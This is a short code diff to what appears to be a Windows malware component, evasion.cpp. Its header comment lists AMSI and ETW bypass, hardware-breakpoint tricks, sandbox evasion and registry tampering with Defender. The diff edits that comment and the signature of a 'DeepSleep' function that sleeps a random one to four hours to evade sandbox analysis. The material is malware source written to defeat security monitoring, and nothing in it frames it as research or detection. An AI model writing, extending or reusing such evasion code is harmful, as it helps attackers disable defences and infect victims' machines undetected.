@@ -1,4 +1,4 @@
-// evasion.cpp — AMSI/ETW/HW-BP + sandbox evasion + deep sleep + registry Defender tampering
+// evasion.cpp — Real AMSI/ETW/HW-BP + sandbox evasion + deep sleep + registry Defender tampering
 #include "evasion.hpp"
 #include "syscalls.hpp"
 #include "utils.hpp"
@@ -30,7 +30,7 @@ static void GhostSleep(DWORD ms) {
 }
 
 // ─── Deep sleep (1–4 hours) ───────────────────────────────────────────────────
-static void DeepSleep() {
+VOID DeepSleep() {
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<DWORD> dist(3600000, 14400000); // 1–4 hours in ms
